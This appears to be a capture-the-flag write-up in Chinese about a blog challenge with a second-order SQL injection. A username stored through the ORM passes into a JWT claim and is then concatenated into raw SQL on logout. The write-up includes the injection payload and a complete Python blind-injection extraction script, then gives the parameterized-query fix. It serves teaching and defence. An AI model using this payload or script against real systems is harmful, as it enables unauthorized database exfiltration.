# Game Boy Advance

## 题目简述

新版博客不再使用 Redis 保存已注销 JWT，而是把令牌标识写入 SQL 数据库。注册时用户名由 ORM 安全保存，但登录后它会原样进入 JWT 的 `username` 声明；注销路由再把该声明拼接进原生 SQL。攻击输入因此先被持久化，经过 JWT 传递，最后在另一个请求中触发，形成二阶 SQL 注入。

## 解题过程

### 跟踪用户名的数据流

注册阶段使用 ORM：

```python
new_user = User(
    public_id=str(uuid.uuid4()),
    username=data["username"],
    # ...
)
```

登录成功后，用户名被复制进 JWT：

```python
access_token = create_access_token(
    identity=user,
    additional_claims={"username": user.username},
)
```

问题出现在 `/logout`。后端验证 JWT 后直接拼接其中的 `username`：

```python
token = get_jwt()
session.execute(text(
    "INSERT INTO exp_jwt (jti, user_id) "
    f"SELECT '{token['jti']}', id FROM users "
    f"WHERE username = '{token['username']}';"
))
```

在注册接口提交单引号不会立即报错，因为 ORM 会正确参数化；使用该账户登录并注销时，单引号才进入上述 SQL。因此这是存储后触发的二阶注入，而不是 JWT 签名绕过。

### 构造错误型布尔盲注

令随机前缀后的用户名为：

```sql
' OR IF(条件, CAST((SELECT 'a') AS INT), 0) -- -
```

拼接后，随机前缀先闭合原字符串。当条件为真时，强制把非数字字符转换为整数，在该写入语境中触发数据库异常，路由返回 HTTP 500；条件为假时返回正常的 HTTP 200。这样就得到一位布尔预言机。

先用 `LENGTH(content)` 求私密文章长度，再逐字比较 `SUBSTRING(content, position, 1)`。完整脚本如下：

```python
import random
import string

import requests


API = "http://target/api"
ALPHABET = string.ascii_letters + string.digits + "_-.@$/{} "


def create_user(username, password="password"):
    requests.post(
        API + "/register",
        json={
            "username": username,
            "mail": "player@example.test",
            "password": password,
        },
    )


def login(username, password="password"):
    response = requests.post(
        API + "/login",
        json={"username": username, "password": password},
    )
    return response.json()["access_token"]


def oracle(condition):
    prefix = random.randbytes(5).hex()
    username = (
        prefix
        + "' OR IF(("
        + condition
        + "), CAST((SELECT 'a') AS INT), 0) -- "
    )
    create_user(username)
    token = login(username)
    response = requests.get(
        API + "/logout",
        headers={"X-Access-Token": token},
    )
    return response.status_code == 500


length = None
for candidate in range(1, 256):
    if oracle(
        "SELECT LENGTH(content) FROM posts "
        f"WHERE is_private=1 LIMIT 1)={candidate}"
    ):
        length = candidate
        break

if length is None:
    raise RuntimeError("failed to recover content length")

flag = ""
for position in range(1, length + 1):
    for char in ALPHABET:
        condition = (
            "SELECT BINARY SUBSTRING(content,"
            f"{position},1) FROM posts "
            "WHERE is_private=1 LIMIT 1"
            f")=0x{ord(char):02x}"
        )
        if oracle(condition):
            flag += char
            print(flag)
            break
    else:
        raise RuntimeError(f"character {position} is outside ALPHABET")

print(flag)
```

脚本恢复出的私密文章内容为：

```text
N0PS{sQl_1nJ3c710n_1n_Jw7_cL41m5}
```

### 理解为何 JWT 校验没有阻止注入

令牌本身由服务端正常签发，签名也始终有效。问题在于“已验证”只保证声明未被传输途中篡改，并不代表声明适合直接拼接到 SQL。用户名最初仍由攻击者控制，服务端只是替攻击者把它签名后送回了危险的数据汇。

## 方法总结

本题展示了典型二阶注入链：注册时安全写库，登录时把持久化数据放进 JWT，注销时错误地把 JWT 声明当成可信 SQL 片段。判断这类问题不能只看单个端点，应追踪输入跨数据库、令牌和后续请求的完整生命周期。修复方式是对所有 SQL 使用绑定参数；JWT 验证、ORM 写入和输入过滤都不能替代最终数据汇处的参数化。
